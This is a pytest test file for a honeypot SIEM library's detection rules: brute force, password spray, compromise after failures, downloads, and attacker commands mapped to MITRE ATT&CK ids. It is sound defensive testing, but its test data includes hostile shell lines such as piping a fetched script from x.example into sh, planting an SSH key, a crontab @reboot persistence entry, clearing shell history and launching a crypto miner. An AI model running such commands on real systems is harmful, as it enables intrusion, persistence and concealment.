import pytest

from honeysiem.detections import (
    DetectionConfig,
    detect_brute_force,
    detect_commands,
    detect_compromise,
    detect_downloads,
    detect_password_spray,
    run_all,
)

from conftest import ev

CFG = DetectionConfig()


def failures(n, spacing=10, ip="203.0.113.10", user="root"):
    return [ev("login_failed", i * spacing, ip=ip, username=user, password=f"pw{i}") for i in range(n)]


def test_brute_force_fires_at_threshold():
    (alert,) = detect_brute_force(failures(10), CFG)
    assert alert.rule_id == "HS-AUTH-001"
    assert alert.technique.id == "T1110.001"
    assert alert.count == 10


def test_brute_force_below_threshold_is_quiet():
    assert detect_brute_force(failures(9), CFG) == []


def test_brute_force_respects_window():
    # 20 failures, one every 10 minutes: low-and-slow, never 10 inside 5 minutes.
    assert detect_brute_force(failures(20, spacing=600), CFG) == []


def test_brute_force_aggregates_per_ip():
    events = failures(15, ip="203.0.113.1") + failures(15, ip="203.0.113.2")
    alerts = detect_brute_force(sorted(events, key=lambda e: e.timestamp), CFG)
    assert sorted(a.src_ip for a in alerts) == ["203.0.113.1", "203.0.113.2"]


def test_password_spray():
    users = ["admin", "test", "oracle", "git", "deploy"]
    events = [ev("login_failed", i, username=u, password="Welcome1") for i, u in enumerate(users)]
    (alert,) = detect_password_spray(events, CFG)
    assert alert.technique.id == "T1110.003"
    assert "Welcome1" in alert.evidence[0]
    assert detect_password_spray(events[:4], CFG) == []


def test_compromise_after_failures():
    events = failures(3) + [ev("login_success", 100, username="root", password="toor")]
    (alert,) = detect_compromise(events, CFG)
    assert alert.severity == "critical" and alert.technique.id == "T1078"
    assert alert.count == 4


def test_success_without_prior_failures_is_quiet():
    events = failures(2) + [ev("login_success", 100, username="root")]
    assert detect_compromise(events, CFG) == []


@pytest.mark.parametrize("command,technique", [
    ("wget http://x.example/a.sh", "T1105"),
    ("curl -s http://x.example | sh", "T1105"),
    ("uname -a", "T1082"),
    ("cat /proc/cpuinfo | grep name", "T1082"),
    ("whoami", "T1087.001"),
    ("echo key >> ~/.ssh/authorized_keys", "T1098.004"),
    ("(crontab -l; echo '@reboot /tmp/x') | crontab -", "T1053.003"),
    ("chmod +x payload", "T1222.002"),
    ("chmod 777 bins.sh", "T1222.002"),
    ("history -c", "T1070.003"),
    ("unset HISTFILE", "T1070.003"),
    ("./xmrig -o stratum+tcp://pool.example:3333", "T1496"),
])
def test_command_rules(command, technique):
    alerts = detect_commands([ev("command", command=command)], CFG)
    assert technique in {a.technique.id for a in alerts}


@pytest.mark.parametrize("command", ["ls -la", "cd /tmp", "chmod 600 notes.txt", "echo hello", "pwd"])
def test_benign_commands_are_quiet(command):
    assert detect_commands([ev("command", command=command)], CFG) == []


def test_downloads():
    (alert,) = detect_downloads([ev("download", url="http://x.example/bot")], CFG)
    assert alert.evidence == ["http://x.example/bot"]


def test_run_all_sorts_by_severity():
    events = failures(12) + [
        ev("login_success", 500, username="root"),
        ev("command", 510, command="uname -a"),
    ]
    severities = [a.severity for a in run_all(events)]
    assert severities[0] == "critical"
    assert severities[-1] == "low"
